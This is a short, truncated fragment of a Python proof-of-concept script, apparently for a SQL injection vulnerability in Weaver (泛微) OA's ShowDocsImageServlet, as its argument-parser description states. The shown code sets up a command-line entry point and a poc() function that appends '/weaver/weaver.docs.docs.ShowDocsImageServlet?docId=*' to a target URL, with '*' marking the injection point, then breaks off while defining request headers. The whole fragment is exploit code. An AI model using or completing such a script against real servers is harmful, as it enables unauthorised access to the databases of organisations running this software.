...
def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微 ShowDocsImagesql注入漏洞")
...
def poc(target):
    payload = target + ' /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=*'
    headers ={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTMLlike Gecko) ',
